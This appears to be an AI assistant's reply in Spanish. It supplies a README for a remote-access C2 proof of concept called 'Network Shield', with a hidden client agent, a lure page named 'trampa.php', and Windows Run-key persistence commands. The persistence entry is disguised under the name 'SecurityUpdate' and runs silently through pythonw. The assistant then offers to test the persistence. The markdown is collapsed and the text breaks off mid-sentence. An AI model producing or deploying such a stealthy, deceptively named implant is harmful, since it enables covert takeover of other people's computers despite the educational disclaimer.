Entiendo perfectamente tu frustración. Lo que está pasando es que al copiar y pegar, el formato Markdown se está "colapsando" porque faltan los saltos de línea dobles que GitHub y VS Code necesitan para separar los bloques.Para solucionarlo de una vez por todas, aquí tienes el código exacto. He puesto espacios extra entre secciones para que, aunque el editor intente juntarlo, se mantenga separado y legible.📄 Borra todo tu README.md y pega esto:Markdown# 🛡️ Network Shield - Remote Administration System (PoC)

Este proyecto es una **Prueba de Concepto (PoC)** diseñada para estudiar el funcionamiento de los sistemas de administración remota (C2) y las técnicas de persistencia en entornos Windows.

> **⚠️ AVISO LEGAL:** Este software ha sido creado exclusivamente con fines educativos y de investigación en ciberseguridad. El autor no se hace responsable del mal uso de este código. El uso en sistemas sin autorización es ilegal.

---

## 🛠️ Requisitos del Sistema

* **XAMPP**: Servidor Apache y MySQL (MariaDB).
* **Python 3.x**: Instalado y con la librería `requests` (`pip install requests`).
* **Base de Datos**: Importar el esquema incluido en `server/db.txt`.

---

## 🚀 Guía de Instalación y Configuración

### 1. Preparación de la Base de Datos
1. Inicia **Apache** y **MySQL** desde el panel de XAMPP.
2. Accede a `http://localhost/phpmyadmin`.
3. Crea una base de datos llamada `network_shield_db`.
4. Importa el contenido de `server/db.txt` en la pestaña **SQL**.

### 2. Configuración del Servidor Web
1. Coloca la carpeta completa `Network-Shield-System` dentro de `C:\xampp\htdocs\`.
2. El panel será accesible en: `http://localhost/Network-Shield-System/server/index.php`.

---

## 📡 Ejecución y Pruebas

Para establecer una conexión exitosa, sigue este orden:

1. **Iniciar el Receptor (Master)**: Abre una terminal en la carpeta `master/` y ejecuta:
   ```bash
   python receptor.py
Lanzar el Agente (Client):Manual: Ejecutar python client/agente.py.Simulación Web: Acceder vía navegador a: http://localhost/Network-Shield-System/server/trampa.php🔐 Implementación de PersistenciaLa persistencia permite que el agente se ejecute automáticamente cada vez que el usuario inicie sesión en Windows.1. Instalación (Crear la persistencia)Envía este comando desde la terminal del receptor para registrar el agente:DOSreg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f
2. Comprobación (Verificar estado)Para confirmar que el registro se ha creado correctamente, ejecuta:DOSreg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"
3. Eliminación (Limpieza del Sistema)Para desactivar el inicio automático y dejar el sistema limpio, ejecuta:DOSreg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f
📂 Estructura del RepositorioCarpetaArchivo PrincipalDescripciónserver/index.phpPanel web, API de reporte y gestión de comandos.client/agente.pyScript que se ejecuta en el objetivo (modo invisible).master/receptor.pyTerminal C2 interactiva para el administrador.📋 Comandos de Prueba DisponiblesUna vez establecida la conexión en el receptor, puedes utilizar:💻 Información: whoami, systeminfo, ipconfig.📂 Navegación: dir, cd .., cd [ruta].🌐 Interacción: start https://google.com, msg * "Aviso de Seguridad".🚪 Finalizar: exit (Cierra la sesión del agente de forma segura).🛠️ Troubleshooting (Solución de Problemas)[!IMPORTANT]Error de Conexión: Verifica que el puerto 4444 no esté bloqueado por el Firewall de Windows.Agente invisible en la Web: Asegúrate de que la URL en agente.py coincida con tu ruta en XAMPP.Error de MySQL: Verifica que el usuario sea root y la base de datos network_shield_db exista.🔄 Registro de CambiosRutas: Actualizadas a /Network-Shield-System/server/.Estructura: Migrada a un sistema modular de tres carpetas independientes.Persistencia: Comando optimizado para ejecución silenciosa con pythonw.exe.
### 💡 Consejo para que no se vea mal:
Al pegar el código en VS Code, asegúrate de que **no tengas activado el "Auto-formateo al pegar"** si usas alguna extensión de Markdown muy agresiva. 

Una vez guardado, dale a la lupa con el ojo arriba a la derecha en VS Code (**Open Preview**) y verás que ahora sí respeta todos los espacios y cuadros.

**¿Quieres que probemos el comando de persistencia ahora o prefieres revisar algún script?** Con esto e
